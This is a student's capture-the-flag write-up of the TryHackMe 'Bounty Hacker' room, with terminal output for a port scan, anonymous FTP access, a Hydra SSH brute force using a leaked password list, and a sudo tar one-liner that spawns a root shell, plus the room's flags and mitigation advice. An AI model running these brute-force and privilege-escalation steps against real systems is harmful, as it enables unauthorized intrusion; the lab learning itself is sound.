# 🏴‍☠️ Bounty Hacker - TryHackMe Writeup

## 🧩 Room Information

* **Platform:** TryHackMe
* **Room:** Bounty Hacker
* **Difficulty:** Easy

---

## 🛠 Tools Used

* Nmap
* FTP
* Hydra
* SSH
* Linux Commands

---

## 🔍 Reconnaissance

Performed a full port scan:

```bash
nmap -p- -sC -sV bounty.thm -oN bountyHacker.txt
```
└─$ nmap -p- -sC -sV bounty.thm -oN bountyHacker.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 21:18 +0500
Stats: 0:03:52 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 15.84% done; ETC: 21:43 (0:20:33 remaining)
Stats: 0:04:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 16.13% done; ETC: 21:44 (0:21:30 remaining)
Stats: 0:07:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 30.38% done; ETC: 21:43 (0:16:51 remaining)
Stats: 0:12:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.61% done; ETC: 21:41 (0:10:54 remaining)
Stats: 0:22:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 74.16% done; ETC: 21:49 (0:07:56 remaining)
Stats: 0:29:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 88.47% done; ETC: 21:51 (0:03:47 remaining)
Stats: 0:32:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.88% done; ETC: 21:52 (0:01:03 remaining)
Nmap scan report for bounty.thm (10.114.164.213)
Host is up (0.14s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.193.208
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 90:42:ab:1f:aa:7c:39:ce:3a:7b:10:50:94:d9:dc:9b (RSA)
|   256 61:d9:9b:05:f7:59:ef:b6:08:a4:b7:57:c8:dc:b4:d0 (ECDSA)
|_  256 ef:40:dc:b5:73:d1:50:dd:df:aa:67:88:b1:7a:06:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2045.96 seconds

### 📌 Results:

* **21/tcp** → FTP (vsftpd 3.0.5)
* **22/tcp** → SSH
* **80/tcp** → HTTP (Apache)

---

## 🔓 Initial Access (FTP Enumeration)

Anonymous login was enabled:

```bash
ftp bounty.thm
```

Login:

```
Username: anonymous
Password: anonymous
```
└─$ ftp 10.114.164.213 21
Connected to 10.114.164.213.
220 (vsFTPd 3.0.5)
Name (10.114.164.213:faiq_4_best): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help

### 📁 Files Found:

* `locks.txt`
* `task.txt`

Downloaded using:

```bash
get locks.txt
get task.txt
```
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt 
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************************************************|   418        3.08 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (3.04 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************************************************|    68      162.75 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.44 KiB/s)
ftp> exit
221 Goodbye.

---

## 🔐 Credential Discovery

### 📄 task.txt:

```
1.) User: lin
```

### 🔑 locks.txt:

Contained multiple possible passwords.
hint : hail hydra

---
└─$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
## ⚔️ Brute Force Attack (SSH)

Used Hydra to find valid credentials:

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
```
└─$ hydra -l lin -P locks.txt 10.114.164.213 ssh      
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-23 21:57:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.114.164.213:22/
[22][ssh] host: 10.114.164.213   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-23 21:57:29

### ✅ Credentials Found:

* **Username:** lin
* **Password:** RedDr4gonSynd1cat3

---

## 💻 SSH Access

```bash
ssh lin@<TARGET_IP>
```


Successfully logged in.

---
└─$ ssh lin@10.114.164.213   
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lin@10.114.164.213's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-114-164-213:~/Desktop$ ls

## 🏁 User Flag

```bash
cat user.txt
```
lin@ip-10-114-164-213:~/Desktop$ ls
user.txt
lin@ip-10-114-164-213:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}

```
THM{CR1M3_SyNd1C4T3}
```

---

## 🔼 Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```
lin@ip-10-114-164-213:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-114-164-213:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-114-164-213:
    (root) /bin/tar

### 📌 Output:

```
(root) /bin/tar
```

---

## 💀 Exploitation

Exploited `tar` to spawn a root shell:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
lin@ip-10-114-164-213:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@ip-10-114-164-213:/home/lin/Desktop# ls
user.txt

---

## 👑 Root Access

```bash
whoami
```

```
root
```

---

## 🏁 Root Flag

```bash
cat /root/root.txt
```
root@ip-10-114-164-213:/home/ubuntu# cd .. 
root@ip-10-114-164-213:/home# cd ..
root@ip-10-114-164-213:/# ls
bin   cdrom  etc   initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  dev    home  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
root@ip-10-114-164-213:/# cd root
root@ip-10-114-164-213:~# ls
root.txt  snap
root@ip-10-114-164-213:~# cat root.txt
THM{80UN7Y_h4cK3r}
root@ip-10-114-164-213:~# Connection to 10.114.164.213 closed by remote host.
Connection to 10.114.164.213 closed.

```
THM{80UN7Y_h4cK3r}
```

---

## 🧠 Key Takeaways

* Misconfigured **anonymous FTP** can expose sensitive data
* Weak credential storage leads to compromise
* Reusing credentials across services is dangerous
* Misconfigured `sudo` permissions can lead to full system compromise

---

## 🛡️ Mitigation Strategies

* Disable anonymous FTP access
* Enforce strong password policies
* Restrict sensitive file access
* Apply least privilege principle for sudo users

---

## 📚 MITRE ATT&CK Mapping

| Phase                | Technique                         |
| -------------------- | --------------------------------- |
| Initial Access       | Valid Accounts                    |
| Credential Access    | Brute Force                       |
| Discovery            | File and Directory Discovery      |
| Privilege Escalation | Abuse Elevation Control Mechanism |

---

## 📸 Screenshots

Add screenshots in a `/screenshots` folder:

* Nmap scan
* FTP access
* Hydra results
* SSH login
* Privilege escalation
* Root flag

---

## ✍️ Author

**Faiq (Cybersecurity Student)**

---
